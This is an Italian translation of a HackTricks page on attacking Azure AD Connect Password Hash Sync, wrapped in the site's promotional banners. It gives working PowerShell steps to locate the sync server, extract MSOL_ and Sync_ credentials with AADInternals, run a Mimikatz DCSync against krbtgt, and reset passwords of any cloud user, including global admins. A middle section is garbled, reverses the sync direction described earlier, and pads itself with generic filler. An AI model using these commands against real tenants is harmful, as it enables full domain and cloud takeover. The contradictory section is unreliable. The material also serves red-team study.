# Az - PHS - Sincronizzazione dell'hash della password

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

[Dalla documentazione:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **La sincronizzazione dell'hash della password** √® uno dei metodi di accesso utilizzati per realizzare l'identit√† ibrida. **Azure AD Connect** sincronizza un hash, dell'hash, della password di un utente da un'istanza di Active Directory locale a un'istanza di Azure AD basata su cloud.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

√à il **metodo pi√π comune** utilizzato dalle aziende per sincronizzare un AD locale con Azure AD.

Tutti gli **utenti** e un **hash degli hash delle password** vengono sincronizzati dall'AD locale ad Azure AD. Tuttavia, **le password in chiaro** o gli **hash originali** non vengono inviati ad Azure AD.\
Inoltre, i **gruppi di sicurezza integrati** (come gli amministratori di dominio...) **non vengono sincronizzati** in Azure AD.

La **sincronizzazione degli hash** avviene ogni **2 minuti**. Tuttavia, per impostazione predefinita, la **scadenza della password** e la **scadenza dell'account** non vengono sincronizzate in Azure AD. Quindi, un utente il cui **password dell'AD locale √® scaduta** (non modificata) pu√≤ continuare ad **accedere alle risorse di Azure** utilizzando la vecchia password.

Quando un utente dell'AD locale desidera accedere a una risorsa di Azure, l'**autenticazione avviene su Azure AD**.

**PHS** √® richiesto per funzionalit√† come **Identity Protection** e AAD Domain Services.

## Pivoting

Quando PHS √® configurato, alcuni **account privilegiati** vengono automaticamente **creati**:

* L'account **`MSOL_<installationID>`** viene creato automaticamente nell'AD locale. A questo account viene assegnato un ruolo **Directory Synchronization Accounts** (vedi [documentazione](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) il che significa che ha **autorizzazioni di replica (DCSync) nell'AD locale**.
* Viene creato un account **`Sync_<nome del server ADConnect locale>_installationID`** in Azure AD. Questo account pu√≤ **reimpostare la password di QUALSIASI utente** (sincronizzato o solo cloud) in Azure AD.

Le password dei due account privilegiati precedenti sono **memorizzate in un server SQL** sul server in cui √® installato **Azure AD Connect**. Gli amministratori possono estrarre le password di quegli utenti privilegiati in chiaro.\
Il database si trova in `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

√à possibile estrarre la configurazione da una delle tabelle, essendo una crittografata:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

La **configurazione crittografata** √® crittografata con **DPAPI** e contiene le **password dell'utente `MSOL_*`** nell'AD locale e la password di **Sync\_\*** in AzureAD. Pertanto, compromettendo queste informazioni √® possibile ottenere privilegi nell'AD e in AzureAD.

Puoi trovare una [panoramica completa su come queste credenziali vengono memorizzate e decifrate in questa presentazione](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Trovare il **server Azure AD connect**

Se il **server in cui √® installato Azure AD Connect** √® connesso al dominio (consigliato nella documentazione), √® possibile trovarlo con:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Abuso di MSOL\_\*

MSOL\_\* √® un insieme di cmdlet di PowerShell utilizzate per gestire Azure AD Connect. Queste cmdlet consentono di configurare e gestire la sincronizzazione delle password tra Azure AD e l'infrastruttura locale.

#### Sincronizzazione delle password con PHS

La sincronizzazione delle password con PHS (Password Hash Sync) √® una delle modalit√† di sincronizzazione supportate da Azure AD Connect. In questa modalit√†, l'hash delle password degli utenti viene sincronizzato da Azure AD al dominio locale, consentendo agli utenti di accedere sia alle risorse cloud che a quelle locali utilizzando la stessa password.

Tuttavia, √® importante notare che la sincronizzazione delle password con PHS pu√≤ essere abusata da un attaccante per ottenere accesso non autorizzato alle risorse locali. Ecco alcuni possibili scenari di abuso:

#### Dump delle password

Un attaccante potrebbe sfruttare una vulnerabilit√† nel sistema locale per ottenere l'accesso al database delle password sincronizzate. Utilizzando strumenti come Mimikatz, potrebbe estrarre le password in chiaro dal database e utilizzarle per accedere alle risorse locali.

#### Pass-the-Hash

Utilizzando l'hash delle password sincronizzate, un attaccante potrebbe eseguire un attacco di tipo "Pass-the-Hash" per ottenere l'accesso alle risorse locali senza conoscere la password effettiva dell'utente. Questo tipo di attacco sfrutta l'hash delle password per autenticarsi come l'utente legittimo.

#### Brute-force delle password

Un attaccante potrebbe tentare di eseguire un attacco di forza bruta sulle password sincronizzate per ottenere l'accesso alle risorse locali. Utilizzando strumenti automatizzati, potrebbe provare diverse combinazioni di password fino a trovare quella corretta.

#### Conclusioni

La sincronizzazione delle password con PHS offre un modo conveniente per gestire le password tra Azure AD e l'infrastruttura locale. Tuttavia, √® importante prendere precauzioni per evitare abusi da parte di attaccanti. √à consigliabile implementare misure di sicurezza aggiuntive, come l'autenticazione a pi√π fattori e la gestione delle password complesse, per proteggere le risorse locali da potenziali attacchi.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Puoi anche utilizzare [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) per ottenere queste credenziali.
{% endhint %}

### Abuso di Sync\_\*

Compromettendo l'account **`Sync_*`** √® possibile **reimpostare la password** di qualsiasi utente (compresi gli amministratori globali)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
√à anche possibile **modificare le password solo degli utenti cloud** (anche se questo √® inaspettato)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
√à anche possibile estrarre la password di questo utente.

{% hint style="danger" %}
Un'altra opzione sarebbe **assegnare privilegiati permessi a un service principal**, a cui l'utente **Sync** ha **permessi**, e quindi **accedere a quel service principal** come metodo di privesc.
{% endhint %}

### Seamless SSO

√à possibile utilizzare Seamless SSO con PHS, che √® vulnerabile ad altri abusi. Controlla qui:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Riferimenti

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
